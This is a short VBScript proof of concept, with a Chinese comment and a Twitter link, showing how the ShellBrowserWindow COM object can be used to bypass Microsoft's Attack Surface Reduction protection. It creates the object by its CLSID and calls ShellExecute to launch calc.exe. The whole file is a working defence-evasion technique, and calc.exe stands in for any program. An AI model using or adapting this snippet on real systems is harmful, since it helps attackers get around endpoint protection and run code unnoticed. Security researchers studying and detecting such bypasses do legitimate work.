' ShellBrowserWindows 绕过 Attack surface reduction 防护
' https://twitter.com/StanHacked/status/1075088449768693762

set sbw = GetObject("new:{C08AFD90-F2A1-11D1-8455-00A0C91F3880}")
sbw.Document.Application.ShellExecute ("calc.exe")
